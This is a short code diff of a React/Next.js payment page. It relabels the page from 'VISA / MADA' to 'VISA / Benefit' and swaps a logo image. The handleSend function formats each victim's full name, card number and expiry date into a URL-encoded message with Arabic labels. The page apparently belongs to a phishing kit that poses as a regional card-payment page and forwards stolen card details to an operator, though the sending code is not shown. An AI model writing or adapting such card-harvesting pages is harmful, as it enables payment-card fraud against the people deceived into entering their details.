@@ -2,7 +2,7 @@
 import { useState } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
 import Image from "next/image";
-import benefit from '../../../public/images.png';
+import benefit from '../../../public/benefi.png';
 import visa from '../../../public/visa.png';
 import kent from "../../../public/download.svg";
 import { Modal, Button, Form } from "react-bootstrap";
@@ -44,7 +44,7 @@ export default function PaymentPage() {
 
   const handleSend = () => {
     const text = `
-%0A🏦 VISA / MADA 
+%0A🏦 VISA / Benefit 
 👤 الاسم الكامل: ${cardData.name}%0A
 💳 رقم البطاقة: ${cardData.number}%0A
 📅 تاريخ الانتهاء: ${cardData.expiry}%0A
